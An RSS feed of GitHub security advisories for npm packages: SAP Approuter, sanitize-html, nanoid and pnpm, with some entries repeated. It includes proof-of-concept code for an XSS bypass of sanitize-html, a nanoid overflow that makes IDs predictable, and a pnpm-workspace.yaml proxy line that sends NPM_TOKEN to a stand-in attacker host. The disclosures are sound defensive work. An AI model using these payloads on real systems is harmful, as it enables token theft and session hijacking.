<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-09-02T06:35:18.243Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@sap/approuter] SAP Approuter has an Information Disclosure vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vhh6-v828-x62f</id>
        <link href="https://github.com/advisories/GHSA-vhh6-v828-x62f"/>
        <updated>2026-09-01T21:21:23.000Z</updated>
        <content type="html"><![CDATA[<p>SAP Approuter does not sufficiently validate certain token content under specific configurations. An unauthenticated attacker could send a specially crafted token to cause sensitive credential material to be sent to an attacker-controlled destination. The attack complexity is high due to non-default preconditions required in the target environment. This results in a high impact on confidentiality and a low impact on integrity and availability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-58230">https://nvd.nist.gov/vuln/detail/CVE-2026-58230</a></li>
<li><a href="https://me.sap.com/notes/3786038">https://me.sap.com/notes/3786038</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-vhh6-v828-x62f">https://github.com/advisories/GHSA-vhh6-v828-x62f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vhh6-v828-x62f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-11T03:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sap/approuter] SAP Approuter Vulnerable to HTTP Request Smuggling]]></title>
        <id>https://github.com/advisories/GHSA-8m85-wqg7-c529</id>
        <link href="https://github.com/advisories/GHSA-8m85-wqg7-c529"/>
        <updated>2026-09-01T21:21:22.000Z</updated>
        <content type="html"><![CDATA[<p>Due to an HTTP Request Smuggling vulnerability in SAP Approuter, an unauthenticated attacker could send a specially crafted HTTP request that leads to request-response desynchronization. This could result in the exposure of user responses and cause the system to become unavailable. This leads to a high impact on confidentiality and availability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27690">https://nvd.nist.gov/vuln/detail/CVE-2026-27690</a></li>
<li><a href="https://me.sap.com/notes/3720138">https://me.sap.com/notes/3720138</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-8m85-wqg7-c529">https://github.com/advisories/GHSA-8m85-wqg7-c529</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8m85-wqg7-c529</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-14T03:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@sap/approuter] SAP Approuter has an Open Redirect vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-44p5-3m5g-vfhj</id>
        <link href="https://github.com/advisories/GHSA-44p5-3m5g-vfhj"/>
        <updated>2026-09-01T21:21:21.000Z</updated>
        <content type="html"><![CDATA[<p>SAP Approuter does not properly validate incoming request headers during the OAuth2 login flow under certain configurations. This allows an unauthenticated remote attacker to craft a malicious link which, when clicked by a victim, could lead to unauthorized access. Successful exploitation results in a high impact to the confidentiality and integrity with no impact on the availability of the application.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44745">https://nvd.nist.gov/vuln/detail/CVE-2026-44745</a></li>
<li><a href="https://me.sap.com/notes/3741519">https://me.sap.com/notes/3741519</a></li>
<li><a href="https://url.sap/sapsecuritypatchday">https://url.sap/sapsecuritypatchday</a></li>
<li><a href="https://github.com/advisories/GHSA-44p5-3m5g-vfhj">https://github.com/advisories/GHSA-44p5-3m5g-vfhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-44p5-3m5g-vfhj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-14T03:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sanitize-html] ApostropheCMS: Stored XSS via SVG SMIL URI-list scheme-policy bypass]]></title>
        <id>https://github.com/advisories/GHSA-g8qq-57p8-ggw5</id>
        <link href="https://github.com/advisories/GHSA-g8qq-57p8-ggw5"/>
        <updated>2026-09-01T21:21:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When SVG animation is allowed, <code>attributeName="href"</code> makes <code>values</code> a list of URL destinations. <code>sanitize-html</code> accepts a list that starts with a safe fragment even when <code>values</code> is explicitly scheme-checked, allowing a later <code>javascript:</code> destination to execute when the sanitized link is activated.</p>
<h3 id="details">Details</h3>
<p><code>index.js:371-383</code> validates each attribute as one flat URL. It does not recognize that <code>attributeName="href"</code> gives the sibling <code>values</code> attribute SMIL URI-list semantics. For <code>values="#safe;javascript:..."</code>, the leading fragment passes the flat check and the complete list is retained.</p>
<h3 id="poc">PoC</h3>
<p>This was reproduced with <code>sanitize-html@2.17.6</code> and Chromium 150.0.7871.124. The configuration adds SVG animation to the defaults and applies the existing scheme policy to <code>values</code>; it does not allow <code>javascript:</code>. Save this as <code>poc.js</code>:</p>
<pre><code class="language-js">const sanitize = require('sanitize-html');

const input = `&lt;svg&gt;&lt;a&gt;&lt;animate attributeName="href" values="#safe;javascript:alert('XSS')" dur=".01s" fill="freeze"&gt;&lt;/animate&gt;&lt;text y="30"&gt;Click me&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;`;
const output = sanitize(input, {
  allowedTags: sanitize.defaults.allowedTags.concat(['svg', 'animate', 'text']),
  allowedAttributes: {
    ...sanitize.defaults.allowedAttributes,
    animate: ['attributename', 'values', 'dur', 'fill'],
    text: ['y']
  },
  allowedSchemesAppliedToAttributes:
    sanitize.defaults.allowedSchemesAppliedToAttributes.concat(['values'])
});
console.log(output);
</code></pre>
<p>Install and run it, then open <code>poc.html</code> and click <code>Click me</code>:</p>
<pre><code class="language-sh">npm install sanitize-html@2.17.6
node poc.js &gt; poc.html
</code></pre>
<p>The output retains the <code>javascript:</code> entry, and clicking the sanitized SVG displays <code>XSS</code>. With <code>input</code> changed to <code>&lt;a href="javascript:alert(1)"&gt;control&lt;/a&gt;</code>, the same configuration removes <code>href</code>.</p>
<h3 id="impact">Impact</h3>
<p>In an application that accepts attacker-authored SVG animation, the attacker can store this payload without scripts or event handlers. A victim who activates the sanitized link executes JavaScript in the application's origin despite the configured scheme policy.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Reject <code>attributeName</code> values selecting <code>href</code> or <code>xlink:href</code> on SVG <code>animate</code> and <code>set</code>, while retaining safe targets such as <code>fill</code>. Add <code>values</code>, <code>from</code>, and <code>to</code> regression cases.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-g8qq-57p8-ggw5">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-g8qq-57p8-ggw5</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/pull/5552">https://github.com/apostrophecms/apostrophe/pull/5552</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/1135516a1a4a8f9638641c460488a43d8af20081">https://github.com/apostrophecms/apostrophe/commit/1135516a1a4a8f9638641c460488a43d8af20081</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/38ff1106c8176b16c2da9872acd9b449adcbb949">https://github.com/apostrophecms/apostrophe/commit/38ff1106c8176b16c2da9872acd9b449adcbb949</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/blob/main/packages/sanitize-html/CHANGELOG.md">https://github.com/apostrophecms/apostrophe/blob/main/packages/sanitize-html/CHANGELOG.md</a></li>
<li><a href="https://github.com/advisories/GHSA-g8qq-57p8-ggw5">https://github.com/advisories/GHSA-g8qq-57p8-ggw5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g8qq-57p8-ggw5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-01T21:20:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nanoid] nanoid: Integer Overflow or Wraparound]]></title>
        <id>https://github.com/advisories/GHSA-xwg4-73v4-xw9w</id>
        <link href="https://github.com/advisories/GHSA-xwg4-73v4-xw9w"/>
        <updated>2026-09-01T19:23:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An integer overflow in <code>nanoid(size)</code> permanently corrupts the process-wide CSPRNG pool, causing all subsequent ID generation to return the deterministic string <code>"uuuuuuuuuuuuuuuuuuuuu"</code>. Any application that passes user-influenced values to the <code>size</code> parameter loses all randomness guarantees for session tokens, CSRF tokens, and unique identifiers until process restart.</p>
<h3 id="details">Details</h3>
<p><code>nanoid()</code> at <a href="https://github.com/ai/nanoid/blob/main/index.js#L101"><code>index.js:101</code></a> coerces the <code>size</code> parameter with <code>size |= 0</code>, which converts it to a signed 32-bit integer. When <code>size &gt;= 2^31</code> (e.g., <code>2147483648</code>), this wraps to <code>-2147483648</code>.</p>
<p>The negative value is passed to <code>fillPool()</code> (<a href="https://github.com/ai/nanoid/blob/main/index.js#L15"><code>index.js:15</code></a>):</p>
<pre><code class="language-javascript">function fillPool(bytes) {
  if (!pool || pool.length &lt; bytes) {       // false: pool exists, -2B &lt; pool.length
    pool = Buffer.allocUnsafe(bytes * POOL_SIZE_MULTIPLIER)
    crypto.getRandomValues(pool)
    poolOffset = 0
  } else if (poolOffset + bytes &gt; pool.length) {  // false: poolOffset + (-2B) &lt; pool.length
    crypto.getRandomValues(pool)
    poolOffset = 0
  }
  poolOffset += bytes  // poolOffset += -2147483648 → deeply negative
}
</code></pre>
<p>Neither branch triggers, so the pool is never refreshed. <code>poolOffset</code> becomes ~-2.1 billion.</p>
<p>Subsequent <code>nanoid()</code> calls execute:</p>
<pre><code class="language-javascript">for (let i = poolOffset - size; i &lt; poolOffset; i++) {
  id += scopedUrlAlphabet[pool[i] &amp; 63]
}
</code></pre>
<p><code>pool[negative_index]</code> returns <code>undefined</code>. <code>undefined &amp; 63</code> evaluates to <code>0</code>. <code>urlAlphabet[0]</code> is <code>'u'</code>. Every ID becomes <code>"uuuuuuuuuuuuuuuuuuuuu"</code>.</p>
<p>The corruption is <strong>persistent</strong> — it affects all subsequent calls in the process until ~100 million calls eventually wrap <code>poolOffset</code> back to positive, or the process restarts.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">import { nanoid } from 'nanoid'

// Step 1: Normal operation
console.log(nanoid())  // e.g., "V1StGXR8_Z5jdHi6B-myT"

// Step 2: Trigger overflow (e.g., from an API parameter)
try { nanoid(2147483648) } catch(e) {}

// Step 3: All subsequent IDs are deterministic
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
// ... forever, process-wide
</code></pre>
<p>Run with: <code>node --experimental-vm-modules poc.mjs</code></p>
<p>Attack scenario: Any API endpoint that accepts a user-controlled length/size parameter (URL shortener slug length, configurable token size, etc.) and passes it to <code>nanoid(userInput)</code>.</p>
<h3 id="impact">Impact</h3>
<p><strong>Complete loss of ID unpredictability and uniqueness, process-wide, from a single request.</strong></p>
<ul>
<li>All session IDs, CSRF tokens, API keys, and database identifiers generated after the attack are identical and predictable</li>
<li>An attacker can predict all tokens issued to other users, enabling session hijacking and authentication bypass</li>
<li>The corruption is persistent (survives across requests) and affects all consumers of <code>nanoid</code> in the same process</li>
<li>No special privileges or preconditions required — a single unauthenticated request is sufficient</li>
<li>Affects any application that passes external input to the <code>size</code> parameter without validation</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w">https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73086">https://nvd.nist.gov/vuln/detail/CVE-2026-73086</a></li>
<li><a href="https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4">https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4</a></li>
<li><a href="https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3">https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3</a></li>
<li><a href="https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac">https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac</a></li>
<li><a href="https://github.com/ai/nanoid/releases/tag/3.3.12">https://github.com/ai/nanoid/releases/tag/3.3.12</a></li>
<li><a href="https://github.com/ai/nanoid/releases/tag/5.1.11">https://github.com/ai/nanoid/releases/tag/5.1.11</a></li>
<li><a href="https://github.com/advisories/GHSA-xwg4-73v4-xw9w">https://github.com/advisories/GHSA-xwg4-73v4-xw9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xwg4-73v4-xw9w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-01T19:23:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nanoid] nanoid: Integer Overflow or Wraparound]]></title>
        <id>https://github.com/advisories/GHSA-xwg4-73v4-xw9w</id>
        <link href="https://github.com/advisories/GHSA-xwg4-73v4-xw9w"/>
        <updated>2026-09-01T19:23:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An integer overflow in <code>nanoid(size)</code> permanently corrupts the process-wide CSPRNG pool, causing all subsequent ID generation to return the deterministic string <code>"uuuuuuuuuuuuuuuuuuuuu"</code>. Any application that passes user-influenced values to the <code>size</code> parameter loses all randomness guarantees for session tokens, CSRF tokens, and unique identifiers until process restart.</p>
<h3 id="details">Details</h3>
<p><code>nanoid()</code> at <a href="https://github.com/ai/nanoid/blob/main/index.js#L101"><code>index.js:101</code></a> coerces the <code>size</code> parameter with <code>size |= 0</code>, which converts it to a signed 32-bit integer. When <code>size &gt;= 2^31</code> (e.g., <code>2147483648</code>), this wraps to <code>-2147483648</code>.</p>
<p>The negative value is passed to <code>fillPool()</code> (<a href="https://github.com/ai/nanoid/blob/main/index.js#L15"><code>index.js:15</code></a>):</p>
<pre><code class="language-javascript">function fillPool(bytes) {
  if (!pool || pool.length &lt; bytes) {       // false: pool exists, -2B &lt; pool.length
    pool = Buffer.allocUnsafe(bytes * POOL_SIZE_MULTIPLIER)
    crypto.getRandomValues(pool)
    poolOffset = 0
  } else if (poolOffset + bytes &gt; pool.length) {  // false: poolOffset + (-2B) &lt; pool.length
    crypto.getRandomValues(pool)
    poolOffset = 0
  }
  poolOffset += bytes  // poolOffset += -2147483648 → deeply negative
}
</code></pre>
<p>Neither branch triggers, so the pool is never refreshed. <code>poolOffset</code> becomes ~-2.1 billion.</p>
<p>Subsequent <code>nanoid()</code> calls execute:</p>
<pre><code class="language-javascript">for (let i = poolOffset - size; i &lt; poolOffset; i++) {
  id += scopedUrlAlphabet[pool[i] &amp; 63]
}
</code></pre>
<p><code>pool[negative_index]</code> returns <code>undefined</code>. <code>undefined &amp; 63</code> evaluates to <code>0</code>. <code>urlAlphabet[0]</code> is <code>'u'</code>. Every ID becomes <code>"uuuuuuuuuuuuuuuuuuuuu"</code>.</p>
<p>The corruption is <strong>persistent</strong> — it affects all subsequent calls in the process until ~100 million calls eventually wrap <code>poolOffset</code> back to positive, or the process restarts.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">import { nanoid } from 'nanoid'

// Step 1: Normal operation
console.log(nanoid())  // e.g., "V1StGXR8_Z5jdHi6B-myT"

// Step 2: Trigger overflow (e.g., from an API parameter)
try { nanoid(2147483648) } catch(e) {}

// Step 3: All subsequent IDs are deterministic
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
console.log(nanoid())  // "uuuuuuuuuuuuuuuuuuuuu"
// ... forever, process-wide
</code></pre>
<p>Run with: <code>node --experimental-vm-modules poc.mjs</code></p>
<p>Attack scenario: Any API endpoint that accepts a user-controlled length/size parameter (URL shortener slug length, configurable token size, etc.) and passes it to <code>nanoid(userInput)</code>.</p>
<h3 id="impact">Impact</h3>
<p><strong>Complete loss of ID unpredictability and uniqueness, process-wide, from a single request.</strong></p>
<ul>
<li>All session IDs, CSRF tokens, API keys, and database identifiers generated after the attack are identical and predictable</li>
<li>An attacker can predict all tokens issued to other users, enabling session hijacking and authentication bypass</li>
<li>The corruption is persistent (survives across requests) and affects all consumers of <code>nanoid</code> in the same process</li>
<li>No special privileges or preconditions required — a single unauthenticated request is sufficient</li>
<li>Affects any application that passes external input to the <code>size</code> parameter without validation</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w">https://github.com/ai/nanoid/security/advisories/GHSA-xwg4-73v4-xw9w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73086">https://nvd.nist.gov/vuln/detail/CVE-2026-73086</a></li>
<li><a href="https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4">https://github.com/ai/nanoid/commit/7087969281cab8ba8ae3babf1894e819068b3bb4</a></li>
<li><a href="https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3">https://github.com/ai/nanoid/commit/821dfed7b5db7f88e92f56c60eef32c8135077c3</a></li>
<li><a href="https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac">https://github.com/ai/nanoid/commit/b0036ed60dc9facd7f1191a50dfb3076500202ac</a></li>
<li><a href="https://github.com/ai/nanoid/releases/tag/3.3.12">https://github.com/ai/nanoid/releases/tag/3.3.12</a></li>
<li><a href="https://github.com/ai/nanoid/releases/tag/5.1.11">https://github.com/ai/nanoid/releases/tag/5.1.11</a></li>
<li><a href="https://github.com/advisories/GHSA-xwg4-73v4-xw9w">https://github.com/advisories/GHSA-xwg4-73v4-xw9w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xwg4-73v4-xw9w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-01T19:23:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Environment secrets exfiltrated via env-placeholder expansion in proxy settings read from an untrusted pnpm-workspace.yaml]]></title>
        <id>https://github.com/advisories/GHSA-vx52-2968-3vc6</id>
        <link href="https://github.com/advisories/GHSA-vx52-2968-3vc6"/>
        <updated>2026-09-01T19:22:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm expands <code>${VAR}</code> environment placeholders in the <code>httpProxy</code> / <code>httpsProxy</code> / <code>noProxy</code> settings read from a project's <code>pnpm-workspace.yaml</code>. Because a project manifest is repository-controlled, a malicious repository that a victim merely clones and runs <code>pnpm install</code> in can route all install traffic through an attacker proxy whose hostname or userinfo embeds — and thereby exfiltrates — an environment secret such as <code>NPM_TOKEN</code> or <code>GITHUB_TOKEN</code>.</p>
<p>This bypasses a trust boundary pnpm deliberately enforces: env-placeholder expansion of request-destination settings is already suppressed for <code>registry</code>, <code>pnprServer</code>, <code>registries</code> and <code>namedRegistries</code> when they come from an untrusted project manifest, and the sibling <code>.npmrc</code> reader already classifies the proxy keys as request destinations. The manifest-side guard set simply omitted them.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who controls only the contents of a repository's <code>pnpm-workspace.yaml</code> — a public repo, a fork, or a supply-chain pull request — can read many values out of the victim's process environment and have them delivered to an attacker-controlled host. No pre-existing access to the victim's store, global config, lockfile, <code>node_modules</code>, or environment is required. The secret is exfiltrated during config loading, before any lifecycle script runs.</p>
<p>This turns "I can author a project manifest" into "I read the victim's environment secrets."</p>
<h2 id="affected-versions">Affected versions</h2>
<p>Introduced in pnpm 10.7.0, which added environment-variable expansion in setting names and values.</p>
<ul>
<li>pnpm 11.x: <code>&gt;= 11.0.0, &lt; 11.11.0</code></li>
<li>pnpm 10.x: <code>&gt;= 10.7.0, &lt; 10.34.5</code></li>
</ul>
<p>The Rust port (<code>pacquet</code>) and the registry server (<code>pnpr</code>) are <strong>not</strong> affected.</p>
<h2 id="patches">Patches</h2>
<ul>
<li><strong>pnpm 11.11.0</strong> and later</li>
<li><strong>pnpm 10.34.5</strong> and later</li>
</ul>
<p>The fix adds <code>httpProxy</code>, <code>httpsProxy</code>, <code>noProxy</code>, <code>proxy</code> and <code>noproxy</code> to the request-destination key set in <code>@pnpm/config.reader</code> (<code>src/getOptionsFromRootManifest.ts</code>), so env placeholders in proxy settings from an untrusted manifest are dropped rather than expanded — matching the existing <code>registry</code> / <code>pnprServer</code> handling and the <code>.npmrc</code> reader's <code>isRequestDestinationValueKey</code>. Regression tests cover the proxy keys.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to a patched version. Until then, do not run pnpm commands in an untrusted repository in an environment that holds secrets, or inspect the repository's <code>pnpm-workspace.yaml</code> for proxy settings before installing.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<pre><code class="language-yaml"># pnpm-workspace.yaml in an untrusted repository
packages:
  - .
httpsProxy: "http://${NPM_TOKEN}.collector.attacker.example.com:8080"
</code></pre>
<p>With <code>NPM_TOKEN</code> set in the victim's environment, <code>pnpm install</code> expands the placeholder and routes install traffic through the attacker's host, whose hostname (and DNS query) carries the token.</p>
<p>Unit level:</p>
<pre><code class="language-js">process.env.PNPM_TEST_TOKEN = 'secret'
const o = getOptionsFromPnpmSettings(process.cwd(), { httpsProxy: 'http://${PNPM_TEST_TOKEN}.evil/' })
// Vulnerable: o.httpsProxy === 'http://secret.evil/'
// Patched:    o.httpsProxy === undefined
</code></pre>
<p>Using <code>registry</code> or <code>pnprServer</code> in place of <code>httpsProxy</code> does not leak on either version — those keys were already guarded, which is what made the proxy keys a hole in an existing boundary rather than an unguarded surface.</p>
<h2 id="credit">Credit</h2>
<p>Reported privately. A second finding in the original report — the <code>Authorization</code> header being retained across a same-host <code>https</code> -&gt; <code>http</code> redirect — was assessed and is <strong>not</strong> treated as a pnpm vulnerability: npm (<code>make-fetch-happen</code>, <code>minipass-fetch</code>), Yarn (<code>got</code>) and reqwest all compare host rather than origin, and a registry that redirects from HTTPS to plaintext HTTP is itself the broken component. That behavior is being discussed publicly at <a href="https://github.com/orgs/pnpm/discussions/13598">https://github.com/orgs/pnpm/discussions/13598</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-vx52-2968-3vc6">https://github.com/pnpm/pnpm/security/advisories/GHSA-vx52-2968-3vc6</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12871">https://github.com/pnpm/pnpm/pull/12871</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12898">https://github.com/pnpm/pnpm/pull/12898</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/36928beae9afb64a2a6a1221df54e66d361320c8">https://github.com/pnpm/pnpm/commit/36928beae9afb64a2a6a1221df54e66d361320c8</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/5a4daec4bd5f0170b18ae053aff093eea56368ba">https://github.com/pnpm/pnpm/commit/5a4daec4bd5f0170b18ae053aff093eea56368ba</a></li>
<li><a href="https://github.com/orgs/pnpm/discussions/13598">https://github.com/orgs/pnpm/discussions/13598</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v10.34.5">https://github.com/pnpm/pnpm/releases/tag/v10.34.5</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v11.11.0">https://github.com/pnpm/pnpm/releases/tag/v11.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vx52-2968-3vc6">https://github.com/advisories/GHSA-vx52-2968-3vc6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vx52-2968-3vc6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-01T19:22:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: Environment secrets exfiltrated via env-placeholder expansion in proxy settings read from an untrusted pnpm-workspace.yaml]]></title>
        <id>https://github.com/advisories/GHSA-vx52-2968-3vc6</id>
        <link href="https://github.com/advisories/GHSA-vx52-2968-3vc6"/>
        <updated>2026-09-01T19:22:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm expands <code>${VAR}</code> environment placeholders in the <code>httpProxy</code> / <code>httpsProxy</code> / <code>noProxy</code> settings read from a project's <code>pnpm-workspace.yaml</code>. Because a project manifest is repository-controlled, a malicious repository that a victim merely clones and runs <code>pnpm install</code> in can route all install traffic through an attacker proxy whose hostname or userinfo embeds — and thereby exfiltrates — an environment secret such as <code>NPM_TOKEN</code> or <code>GITHUB_TOKEN</code>.</p>
<p>This bypasses a trust boundary pnpm deliberately enforces: env-placeholder expansion of request-destination settings is already suppressed for <code>registry</code>, <code>pnprServer</code>, <code>registries</code> and <code>namedRegistries</code> when they come from an untrusted project manifest, and the sibling <code>.npmrc</code> reader already classifies the proxy keys as request destinations. The manifest-side guard set simply omitted them.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who controls only the contents of a repository's <code>pnpm-workspace.yaml</code> — a public repo, a fork, or a supply-chain pull request — can read many values out of the victim's process environment and have them delivered to an attacker-controlled host. No pre-existing access to the victim's store, global config, lockfile, <code>node_modules</code>, or environment is required. The secret is exfiltrated during config loading, before any lifecycle script runs.</p>
<p>This turns "I can author a project manifest" into "I read the victim's environment secrets."</p>
<h2 id="affected-versions">Affected versions</h2>
<p>Introduced in pnpm 10.7.0, which added environment-variable expansion in setting names and values.</p>
<ul>
<li>pnpm 11.x: <code>&gt;= 11.0.0, &lt; 11.11.0</code></li>
<li>pnpm 10.x: <code>&gt;= 10.7.0, &lt; 10.34.5</code></li>
</ul>
<p>The Rust port (<code>pacquet</code>) and the registry server (<code>pnpr</code>) are <strong>not</strong> affected.</p>
<h2 id="patches">Patches</h2>
<ul>
<li><strong>pnpm 11.11.0</strong> and later</li>
<li><strong>pnpm 10.34.5</strong> and later</li>
</ul>
<p>The fix adds <code>httpProxy</code>, <code>httpsProxy</code>, <code>noProxy</code>, <code>proxy</code> and <code>noproxy</code> to the request-destination key set in <code>@pnpm/config.reader</code> (<code>src/getOptionsFromRootManifest.ts</code>), so env placeholders in proxy settings from an untrusted manifest are dropped rather than expanded — matching the existing <code>registry</code> / <code>pnprServer</code> handling and the <code>.npmrc</code> reader's <code>isRequestDestinationValueKey</code>. Regression tests cover the proxy keys.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Upgrade to a patched version. Until then, do not run pnpm commands in an untrusted repository in an environment that holds secrets, or inspect the repository's <code>pnpm-workspace.yaml</code> for proxy settings before installing.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<pre><code class="language-yaml"># pnpm-workspace.yaml in an untrusted repository
packages:
  - .
httpsProxy: "http://${NPM_TOKEN}.collector.attacker.example.com:8080"
</code></pre>
<p>With <code>NPM_TOKEN</code> set in the victim's environment, <code>pnpm install</code> expands the placeholder and routes install traffic through the attacker's host, whose hostname (and DNS query) carries the token.</p>
<p>Unit level:</p>
<pre><code class="language-js">process.env.PNPM_TEST_TOKEN = 'secret'
const o = getOptionsFromPnpmSettings(process.cwd(), { httpsProxy: 'http://${PNPM_TEST_TOKEN}.evil/' })
// Vulnerable: o.httpsProxy === 'http://secret.evil/'
// Patched:    o.httpsProxy === undefined
</code></pre>
<p>Using <code>registry</code> or <code>pnprServer</code> in place of <code>httpsProxy</code> does not leak on either version — those keys were already guarded, which is what made the proxy keys a hole in an existing boundary rather than an unguarded surface.</p>
<h2 id="credit">Credit</h2>
<p>Reported privately. A second finding in the original report — the <code>Authorization</code> header being retained across a same-host <code>https</code> -&gt; <code>http</code> redirect — was assessed and is <strong>not</strong> treated as a pnpm vulnerability: npm (<code>make-fetch-happen</code>, <code>minipass-fetch</code>), Yarn (<code>got</code>) and reqwest all compare host rather than origin, and a registry that redirects from HTTPS to plaintext HTTP is itself the broken component. That behavior is being discussed publicly at <a href="https://github.com/orgs/pnpm/discussions/13598">https://github.com/orgs/pnpm/discussions/13598</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-vx52-2968-3vc6">https://github.com/pnpm/pnpm/security/advisories/GHSA-vx52-2968-3vc6</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12871">https://github.com/pnpm/pnpm/pull/12871</a></li>
